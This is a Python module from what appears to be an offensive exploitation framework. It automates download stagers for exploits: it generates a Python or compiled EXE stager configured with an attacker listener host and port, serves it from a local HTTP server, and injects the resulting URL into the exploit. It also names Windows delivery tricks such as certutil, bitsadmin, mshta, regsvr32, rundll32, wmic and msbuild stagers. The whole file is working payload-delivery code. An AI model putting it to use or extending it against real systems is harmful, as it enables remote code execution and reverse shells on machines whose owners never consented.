#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Auto-orchestrate download stagers (generate file + start HTTP host)."""

from __future__ import annotations

from pathlib import Path
from typing import Any, Optional

from core.framework.payload_paths import is_download_stager_path
from core.output_handler import print_info, print_success, print_warning
from lib.c2.download_stagers import build_stager_url
from lib.c2.stager_host import StagerHost

THIN_STAGER_PATH = "payloads/singles/cmd/multi/python_thin_stager"
DEFAULT_STAGER_DIR = "output/stagers"

_EXE_STAGER_MARKERS = (
    "certutil_exe_stager",
    "bitsadmin_exe_stager",
    "curl_exe_stager",
    "mshta_remote_stager",
    "regsvr32_sct_stager",
    "rundll32_js_stager",
    "wmic_xsl_stager",
    "msbuild_remote_stager",
)


def _opt_value(module: Any, name: str, default=None):
    if module is None:
        return default
    attr = getattr(module, name, default)
    if attr is None:
        return default
    if hasattr(attr, "value"):
        return attr.value
    return attr


def _set_option(module: Any, name: str, value: str) -> None:
    if hasattr(module, "set_option"):
        try:
            module.set_option(name, value)
            return
        except Exception:
            pass
    if hasattr(module, name):
        opt = getattr(module, name)
        if hasattr(opt, "value"):
            opt.value = value
        elif hasattr(opt, "__set__"):
            opt.__set__(module, value)
        else:
            setattr(module, name, value)


def _needs_exe_stager(payload_path: str) -> bool:
    low = str(payload_path or "").lower()
    return any(m in low for m in _EXE_STAGER_MARKERS)


def prepare_download_stager_if_needed(exploit: Any) -> Optional[str]:
    """Generate hosted stager, start StagerHost, set stager_url on exploit. Returns URL or None."""
    payload_path = ""
    if hasattr(exploit, "_get_configured_payload_path"):
        payload_path = str(exploit._get_configured_payload_path() or "")
    if not payload_path or not is_download_stager_path(payload_path):
        return None

    existing = str(_opt_value(exploit, "stager_url", "") or "").strip()
    if existing:
        return existing

    framework = getattr(exploit, "framework", None)
    if not framework or not hasattr(framework, "module_loader"):
        print_warning("Download stager: framework module_loader unavailable")
        return None

    lhost = str(_opt_value(exploit, "lhost", "127.0.0.1") or "127.0.0.1")
    lport = int(_opt_value(exploit, "lport", 4444) or 4444)
    stager_port = int(_opt_value(exploit, "stager_port", 8000) or 8000)

    thin = framework.module_loader.load_module(THIN_STAGER_PATH, framework=framework)
    if not thin:
        print_warning(f"Download stager: could not load {THIN_STAGER_PATH}")
        return None

    if hasattr(thin, "lhost"):
        thin.lhost = lhost
    if hasattr(thin, "lport"):
        thin.lport = lport

    directory = Path(DEFAULT_STAGER_DIR)
    directory.mkdir(parents=True, exist_ok=True)

    dest_name = "stager.exe" if _needs_exe_stager(payload_path) else "stager.py"
    dest = directory / dest_name

    if dest_name.endswith(".exe"):
        if hasattr(thin, "compile_exe"):
            thin.compile_exe = True
        if hasattr(thin, "output_path"):
            thin.output_path = str(dest)
        generated = thin.generate()
        text = str(generated or "")
        if text.startswith("# compiled:"):
            exe_path = text.split(":", 1)[-1].strip()
            if Path(exe_path).is_file():
                dest.write_bytes(Path(exe_path).read_bytes())
            elif dest.is_file():
                pass
            else:
                print_warning(
                    "Download stager: EXE compile failed — set compile_exe on python_thin_stager "
                    "or host stager.exe manually"
                )
                return None
        elif isinstance(generated, bytes):
            dest.write_bytes(generated)
        else:
            print_warning("Download stager: expected compiled EXE; manual host_stager generate required")
            return None
    else:
        if hasattr(thin, "get_python_script"):
            script = thin.get_python_script()
        else:
            generated = thin.generate()
            if isinstance(generated, bytes):
                dest.write_bytes(generated)
                script = None
            else:
                script = str(generated or "")
        if script is not None:
            dest.write_text(script, encoding="utf-8")

    host = StagerHost.get()
    try:
        base = host.start(str(directory.resolve()), port=stager_port)
    except Exception as exc:
        print_warning(f"Download stager: failed to start HTTP host: {exc}")
        return None

    stager_url = build_stager_url(lhost, stager_port, f"/{dest_name}")
    if base and not stager_url.startswith("http"):
        stager_url = f"{base.rstrip('/')}/{dest_name}"

    _set_option(exploit, "stager_url", stager_url)
    print_success(f"Download stager ready: {stager_url}")
    print_info(f"Hosted {dest.name} from {directory} (port {stager_port})")
    return stager_url
